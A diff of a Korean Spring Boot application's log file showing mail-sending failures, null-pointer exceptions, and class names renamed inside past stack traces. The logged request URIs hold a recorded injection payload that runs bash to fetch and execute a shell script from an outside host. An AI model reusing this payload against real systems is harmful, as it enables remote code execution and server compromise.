 	at com.example.hobbyheavy.service.NotificationService.sendNotification(NotificationService.java:65)
 	at com.example.hobbyheavy.service.NotificationService.notifyParticipants(NotificationService.java:48)
 	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
@@ -1043,8 +1043,8 @@ Caused by: jakarta.mail.AuthenticationFailedException: 534-5.7.9 Application-spe
 2024-11-25 16:12:58.889  c.e.h.s.DynamicScheduleService - 스케줄링이 설정되었습니다. 스케줄 ID: 6, 마감 시간: 2024-12-01T17:00 
 2024-11-25 16:12:58.889  c.e.h.s.ScheduleService - 스케줄이 생성되었습니다. ID: 6 
 2024-11-25 16:12:58.889  c.e.h.s.ScheduleService - 스케줄 생성 알림이 발송되었습니다. 스케줄 ID: 6 
-2024-11-25 16:12:58.893  c.e.h.e.GlobalExceptionHandler - 예기치 못한 예외 발생: Cannot invoke "com.example.hobbyheavy.type.MeetupScheduleStatus.name()" because the return value of "com.example.hobbyheavy.entity.MeetupSchedule.getScheduleStatus()" is null 
-2024-11-25 16:12:58.900  o.s.w.s.m.m.a.ExceptionHandlerExceptionResolver - Resolved [java.lang.NullPointerException: Cannot invoke "com.example.hobbyheavy.type.MeetupScheduleStatus.name()" because the return value of "com.example.hobbyheavy.entity.MeetupSchedule.getScheduleStatus()" is null] 
+2024-11-25 16:12:58.893  c.e.h.e.GlobalExceptionHandler - 예기치 못한 예외 발생: Cannot invoke "com.example.hobbyheavy.type.ScheduleStatus.name()" because the return value of "com.example.hobbyheavy.entity.Schedule.getScheduleStatus()" is null
+2024-11-25 16:12:58.900  o.s.w.s.m.m.a.ExceptionHandlerExceptionResolver - Resolved [java.lang.NullPointerException: Cannot invoke "com.example.hobbyheavy.type.ScheduleStatus.name()" because the return value of "com.example.hobbyheavy.entity.Schedule.getScheduleStatus()" is null]
 2024-11-25 16:22:11.871  c.e.h.j.JWTFilter - JWTFilter - Request URI: /$%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27echo%20dnVybCgpIHsKCUlGUz0vIHJlYWQgLXIgcHJvdG8geCBob3N0IHF1ZXJ5IDw8PCIkMSIKICAgIGV4ZWMgMzw%2BIi9kZXYvdGNwLyR7aG9zdH0vJHtQT1JUOi04MH0iCiAgICBlY2hvIC1lbiAiR0VUIC8ke3F1ZXJ5fSBIVFRQLzEuMFxyXG5Ib3N0OiAke2hvc3R9XHJcblxyXG4iID4mMwogICAgKHdoaWxlIHJlYWQgLXIgbDsgZG8gZWNobyA%2BJjIgIiRsIjsgW1sgJGwgPT0gJCdccicgXV0gJiYgYnJlYWs7IGRvbmUgJiYgY2F0ICkgPCYzCiAgICBleGVjIDM%2BJi0KfQp2dXJsIGh0dHA6Ly9iLjktOS04LmNvbS9icnlzai93LnNofGJhc2gK%7Cbase64%20-d%7Cbash%27%29.start%28%29%22%29%7D/ 
 2024-11-25 16:22:11.871  c.e.h.j.JWTFilter - JWTFilter - No access token found. Request URI: /$%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27echo%20dnVybCgpIHsKCUlGUz0vIHJlYWQgLXIgcHJvdG8geCBob3N0IHF1ZXJ5IDw8PCIkMSIKICAgIGV4ZWMgMzw%2BIi9kZXYvdGNwLyR7aG9zdH0vJHtQT1JUOi04MH0iCiAgICBlY2hvIC1lbiAiR0VUIC8ke3F1ZXJ5fSBIVFRQLzEuMFxyXG5Ib3N0OiAke2hvc3R9XHJcblxyXG4iID4mMwogICAgKHdoaWxlIHJlYWQgLXIgbDsgZG8gZWNobyA%2BJjIgIiRsIjsgW1sgJGwgPT0gJCdccicgXV0gJiYgYnJlYWs7IGRvbmUgJiYgY2F0ICkgPCYzCiAgICBleGVjIDM%2BJi0KfQp2dXJsIGh0dHA6Ly9iLjktOS04LmNvbS9icnlzai93LnNofGJhc2gK%7Cbase64%20-d%7Cbash%27%29.start%28%29%22%29%7D/ 
 2024-11-25 16:28:29.691  o.s.o.j.LocalContainerEntityManagerFactoryBean - Closing JPA EntityManagerFactory for persistence unit 'default' 
@@ -1135,8 +1135,8 @@ org.springframework.mail.MailAuthenticationException: Authentication failed
 	at org.springframework.mail.javamail.JavaMailSenderImpl.doSend(JavaMailSenderImpl.java:402)
 	at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:317)
 	at org.springframework.mail.MailSender.send(MailSender.java:42)
-	at com.example.hobbyheavy.service.EmailNotificationSender.sendWithSubject(EmailNotificationSender.java:52)
-	at com.example.hobbyheavy.service.EmailNotificationSender.send(EmailNotificationSender.java:34)
+	at com.example.hobbyheavy.service.NotificationSenderService.sendWithSubject(EmailNotificationSender.java:52)
+	at com.example.hobbyheavy.service.NotificationSenderService.send(EmailNotificationSender.java:34)
 	at com.example.hobbyheavy.service.NotificationService.sendNotification(NotificationService.java:65)
 	at com.example.hobbyheavy.service.NotificationService.notifyParticipants(NotificationService.java:48)
 	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
@@ -1398,8 +1398,8 @@ Caused by: jakarta.mail.AuthenticationFailedException: 534-5.7.9 Application-spe
 2024-11-25 16:44:29.142  c.e.h.s.NotificationService - [알림 전송] 성공 - 참여자: kwon, 메시지: 새로운 스케줄이 생성되었습니다. 스케줄 ID: 10 
 2024-11-25 16:44:29.160  c.e.h.s.NotificationService - [내부 알림 저장] 알림이 저장되었습니다. 사용자 ID: kwon, 알림 유형: SCHEDULE_CREATION, 메시지: 새로운 스케줄이 생성되었습니다. 스케줄 ID: 10 
 2024-11-25 16:44:29.160  c.e.h.s.ScheduleService - 스케줄 생성 알림이 발송되었습니다. 스케줄 ID: 10 
-2024-11-25 16:44:29.164  c.e.h.e.GlobalExceptionHandler - 예기치 못한 예외 발생: Cannot invoke "com.example.hobbyheavy.type.MeetupScheduleStatus.name()" because the return value of "com.example.hobbyheavy.entity.MeetupSchedule.getScheduleStatus()" is null 
-2024-11-25 16:44:29.172  o.s.w.s.m.m.a.ExceptionHandlerExceptionResolver - Resolved [java.lang.NullPointerException: Cannot invoke "com.example.hobbyheavy.type.MeetupScheduleStatus.name()" because the return value of "com.example.hobbyheavy.entity.MeetupSchedule.getScheduleStatus()" is null] 
+2024-11-25 16:44:29.164  c.e.h.e.GlobalExceptionHandler - 예기치 못한 예외 발생: Cannot invoke "com.example.hobbyheavy.type.ScheduleStatus.name()" because the return value of "com.example.hobbyheavy.entity.Schedule.getScheduleStatus()" is null
+2024-11-25 16:44:29.172  o.s.w.s.m.m.a.ExceptionHandlerExceptionResolver - Resolved [java.lang.NullPointerException: Cannot invoke "com.example.hobbyheavy.type.ScheduleStatus.name()" because the return value of "com.example.hobbyheavy.entity.Schedule.getScheduleStatus()" is null]
 2024-11-25 16:47:35.920  o.s.o.j.LocalContainerEntityManagerFactoryBean - Closing JPA EntityManagerFactory for persistence unit 'default' 
 2024-11-25 16:47:35.922  c.z.h.HikariDataSource - HikariPool-1 - Shutdown initiated... 
 2024-11-25 16:47:35.925  c.z.h.HikariDataSource - HikariPool-1 - Shutdown completed. 
@@ -1970,8 +1970,8 @@ org.springframework.mail.MailAuthenticationException: Authentication failed
 	at org.springframework.mail.javamail.JavaMailSenderImpl.doSend(JavaMailSenderImpl.java:402)
 	at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:317)
 	at org.springframework.mail.MailSender.send(MailSender.java:42)
-	at com.example.hobbyheavy.service.EmailNotificationSender.sendWithSubject(EmailNotificationSender.java:55)
-	at com.example.hobbyheavy.service.EmailNotificationSender.send(EmailNotificationSender.java:34)
+	at com.example.hobbyheavy.service.NotificationSenderService.sendWithSubject(EmailNotificationSender.java:55)
+	at com.example.hobbyheavy.service.NotificationSenderService.send(EmailNotificationSender.java:34)
 	at com.example.hobbyheavy.service.NotificationService.sendNotification(NotificationService.java:65)
 	at com.example.hobbyheavy.service.NotificationService.notifyParticipants(NotificationService.java:48)
 	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
@@ -2183,8 +2183,8 @@ org.springframework.mail.MailAuthenticationException: Authentication failed
 	at org.springframework.mail.javamail.JavaMailSenderImpl.doSend(JavaMailSenderImpl.java:402)
 	at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:317)
 	at org.springframework.mail.MailSender.send(MailSender.java:42)
-	at com.example.hobbyheavy.service.EmailNotificationSender.sendWithSubject(EmailNotificationSender.java:55)
-	at com.example.hobbyheavy.service.EmailNotificationSender.send(EmailNotificationSender.java:34)
+	at com.example.hobbyheavy.service.NotificationSenderService.sendWithSubject(EmailNotificationSender.java:55)
+	at com.example.hobbyheavy.service.NotificationSenderService.send(EmailNotificationSender.java:34)
 	at com.example.hobbyheavy.service.NotificationService.sendNotification(NotificationService.java:65)
 	at com.example.hobbyheavy.service.NotificationService.notifyParticipants(NotificationService.java:48)
 	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
@@ -2395,8 +2395,8 @@ org.springframework.mail.MailAuthenticationException: Authentication failed
 	at org.springframework.mail.javamail.JavaMailSenderImpl.doSend(JavaMailSenderImpl.java:402)
 	at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:317)
 	at org.springframework.mail.MailSender.send(MailSender.java:42)
-	at com.example.hobbyheavy.service.EmailNotificationSender.sendWithSubject(EmailNotificationSender.java:55)
-	at com.example.hobbyheavy.service.EmailNotificationSender.send(EmailNotificationSender.java:34)
+	at com.example.hobbyheavy.service.NotificationSenderService.sendWithSubject(EmailNotificationSender.java:55)
+	at com.example.hobbyheavy.service.NotificationSenderService.send(EmailNotificationSender.java:34)
 	at com.example.hobbyheavy.service.NotificationService.sendNotification(NotificationService.java:65)
 	at com.example.hobbyheavy.service.NotificationService.notifyParticipants(NotificationService.java:48)
 	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
@@ -2607,8 +2607,8 @@ org.springframework.mail.MailAuthenticationException: Authentication failed
 	at org.springframework.mail.javamail.JavaMailSenderImpl.doSend(JavaMailSenderImpl.java:402)
 	at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:317)
 	at org.springframework.mail.MailSender.send(MailSender.java:42)
-	at com.example.hobbyheavy.service.EmailNotificationSender.sendWithSubject(EmailNotificationSender.java:55)
-	at com.example.hobbyheavy.service.EmailNotificationSender.send(EmailNotificationSender.java:34)
+	at com.example.hobbyheavy.service.NotificationSenderService.sendWithSubject(EmailNotificationSender.java:55)
+	at com.example.hobbyheavy.service.NotificationSenderService.send(EmailNotificationSender.java:34)
 	at com.example.hobbyheavy.service.NotificationService.sendNotification(NotificationService.java:65)
 	at com.example.hobbyheavy.service.NotificationService.notifyParticipants(NotificationService.java:48)
 	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
@@ -2822,8 +2822,8 @@ org.springframework.mail.MailSendException: Failed messages: org.eclipse.angus.m
 	at org.springframework.mail.javamail.JavaMailSenderImpl.doSend(JavaMailSenderImpl.java:453)
 	at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:317)
 	at org.springframework.mail.MailSender.send(MailSender.java:42)
-	at com.example.hobbyheavy.service.EmailNotificationSender.sendWithSubject(EmailNotificationSender.java:55)
-	at com.example.hobbyheavy.service.EmailNotificationSender.send(EmailNotificationSender.java:34)
+	at com.example.hobbyheavy.service.NotificationSenderService.sendWithSubject(EmailNotificationSender.java:55)
+	at com.example.hobbyheavy.service.NotificationSenderService.send(EmailNotificationSender.java:34)
 	at com.example.hobbyheavy.service.NotificationService.sendNotification(NotificationService.java:65)
 	at com.example.hobbyheavy.service.NotificationService.notifyParticipants(NotificationService.java:48)
 	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
@@ -3025,8 +3025,8 @@ org.springframework.mail.MailSendException: Failed messages: org.eclipse.angus.m
 	at org.springframework.mail.javamail.JavaMailSenderImpl.doSend(JavaMailSenderImpl.java:453)
 	at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:317)
 	at org.springframework.mail.MailSender.send(MailSender.java:42)
-	at com.example.hobbyheavy.service.EmailNotificationSender.sendWithSubject(EmailNotificationSender.java:54)
-	at com.example.hobbyheavy.service.EmailNotificationSender.send(EmailNotificationSender.java:34)
+	at com.example.hobbyheavy.service.NotificationSenderService.sendWithSubject(EmailNotificationSender.java:54)
+	at com.example.hobbyheavy.service.NotificationSenderService.send(EmailNotificationSender.java:34)
 	at com.example.hobbyheavy.service.NotificationService.sendNotification(NotificationService.java:65)
 	at com.example.hobbyheavy.service.NotificationService.notifyParticipants(NotificationService.java:48)
 	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
@@ -3302,8 +3302,8 @@ org.springframework.mail.MailSendException: Failed messages: org.eclipse.angus.m
 	at org.springframework.mail.javamail.JavaMailSenderImpl.doSend(JavaMailSenderImpl.java:453)
 	at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:317)
 	at org.springframework.mail.MailSender.send(MailSender.java:42)
-	at com.example.hobbyheavy.service.EmailNotificationSender.sendWithSubject(EmailNotificationSender.java:54)
-	at com.example.hobbyheavy.service.EmailNotificationSender.send(EmailNotificationSender.java:34)
+	at com.example.hobbyheavy.service.NotificationSenderService.sendWithSubject(EmailNotificationSender.java:54)
+	at com.example.hobbyheavy.service.NotificationSenderService.send(EmailNotificationSender.java:34)
 	at com.example.hobbyheavy.service.NotificationService.sendNotification(NotificationService.java:65)
 	at com.example.hobbyheavy.service.NotificationService.notifyParticipants(NotificationService.java:48)
 	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
@@ -3504,8 +3504,8 @@ org.springframework.mail.MailAuthenticationException: Authentication failed
 	at org.springframework.mail.javamail.JavaMailSenderImpl.doSend(JavaMailSenderImpl.java:402)
 	at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:317)
 	at org.springframework.mail.MailSender.send(MailSender.java:42)
-	at com.example.hobbyheavy.service.EmailNotificationSender.sendWithSubject(EmailNotificationSender.java:54)
-	at com.example.hobbyheavy.service.EmailNotificationSender.send(EmailNotificationSender.java:34)
+	at com.example.hobbyheavy.service.NotificationSenderService.sendWithSubject(EmailNotificationSender.java:54)
+	at com.example.hobbyheavy.service.NotificationSenderService.send(EmailNotificationSender.java:34)
 	at com.example.hobbyheavy.service.NotificationService.sendNotification(NotificationService.java:65)
 	at com.example.hobbyheavy.service.NotificationService.notifyParticipants(NotificationService.java:48)
 	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
@@ -3716,8 +3716,8 @@ org.springframework.mail.MailSendException: Failed messages: org.eclipse.angus.m
 	at org.springframework.mail.javamail.JavaMailSenderImpl.doSend(JavaMailSenderImpl.java:453)
 	at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:317)
 	at org.springframework.mail.MailSender.send(MailSender.java:42)
-	at com.example.hobbyheavy.service.EmailNotificationSender.sendWithSubject(EmailNotificationSender.java:54)
-	at com.example.hobbyheavy.service.EmailNotificationSender.send(EmailNotificationSender.java:34)
+	at com.example.hobbyheavy.service.NotificationSenderService.sendWithSubject(EmailNotificationSender.java:54)
+	at com.example.hobbyheavy.service.NotificationSenderService.send(EmailNotificationSender.java:34)
 	at com.example.hobbyheavy.service.NotificationService.sendNotification(NotificationService.java:65)
 	at com.example.hobbyheavy.service.NotificationService.notifyParticipants(NotificationService.java:48)
 	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
@@ -3877,8 +3877,8 @@ org.springframework.mail.MailSendException: Failed messages: org.eclipse.angus.m
 	at org.springframework.mail.javamail.JavaMailSenderImpl.doSend(JavaMailSenderImpl.java:453)
 	at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:317)
 	at org.springframework.mail.MailSender.send(MailSender.java:42)
-	at com.example.hobbyheavy.service.EmailNotificationSender.sendWithSubject(EmailNotificationSender.java:54)
-	at com.example.hobbyheavy.service.EmailNotificationSender.send(EmailNotificationSender.java:34)
+	at com.example.hobbyheavy.service.NotificationSenderService.sendWithSubject(EmailNotificationSender.java:54)
+	at com.example.hobbyheavy.service.NotificationSenderService.send(EmailNotificationSender.java:34)
 	at com.example.hobbyheavy.service.NotificationService.sendNotification(NotificationService.java:65)
 	at com.example.hobbyheavy.service.NotificationService.notifyParticipants(NotificationService.java:48)
 	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
@@ -4038,8 +4038,8 @@ org.springframework.mail.MailSendException: Failed messages: org.eclipse.angus.m
 	at org.springframework.mail.javamail.JavaMailSenderImpl.doSend(JavaMailSenderImpl.java:453)
 	at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:317)
 	at org.springframework.mail.MailSender.send(MailSender.java:42)
-	at com.example.hobbyheavy.service.EmailNotificationSender.sendWithSubject(EmailNotificationSender.java:54)
-	at com.example.hobbyheavy.service.EmailNotificationSender.send(EmailNotificationSender.java:34)
+	at com.example.hobbyheavy.service.NotificationSenderService.sendWithSubject(EmailNotificationSender.java:54)
+	at com.example.hobbyheavy.service.NotificationSenderService.send(EmailNotificationSender.java:34)
 	at com.example.hobbyheavy.service.NotificationService.sendNotification(NotificationService.java:65)
 	at com.example.hobbyheavy.service.NotificationService.notifyParticipants(NotificationService.java:48)
 	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
@@ -4240,8 +4240,8 @@ org.springframework.mail.MailSendException: Mail server connection failed. Faile
 	at org.springframework.mail.javamail.JavaMailSenderImpl.doSend(JavaMailSenderImpl.java:410)
 	at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:317)
 	at org.springframework.mail.MailSender.send(MailSender.java:42)
-	at com.example.hobbyheavy.service.EmailNotificationSender.sendWithSubject(EmailNotificationSender.java:54)
-	at com.example.hobbyheavy.service.EmailNotificationSender.send(EmailNotificationSender.java:34)
+	at com.example.hobbyheavy.service.NotificationSenderService.sendWithSubject(EmailNotificationSender.java:54)
+	at com.example.hobbyheavy.service.NotificationSenderService.send(EmailNotificationSender.java:34)
 	at com.example.hobbyheavy.service.NotificationService.sendNotification(NotificationService.java:65)
 	at com.example.hobbyheavy.service.NotificationService.notifyParticipants(NotificationService.java:48)
 	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
@@ -4449,8 +4449,8 @@ org.springframework.mail.MailAuthenticationException: Authentication failed
 	at org.springframework.mail.javamail.JavaMailSenderImpl.doSend(JavaMailSenderImpl.java:402)
 	at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:317)
 	at org.springframework.mail.MailSender.send(MailSender.java:42)
-	at com.example.hobbyheavy.service.EmailNotificationSender.sendWithSubject(EmailNotificationSender.java:54)
-	at com.example.hobbyheavy.service.EmailNotificationSender.send(EmailNotificationSender.java:34)
+	at com.example.hobbyheavy.service.NotificationSenderService.sendWithSubject(EmailNotificationSender.java:54)
+	at com.example.hobbyheavy.service.NotificationSenderService.send(EmailNotificationSender.java:34)
 	at com.example.hobbyheavy.service.NotificationService.sendNotification(NotificationService.java:65)
 	at com.example.hobbyheavy.service.NotificationService.notifyParticipants(NotificationService.java:48)
 	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
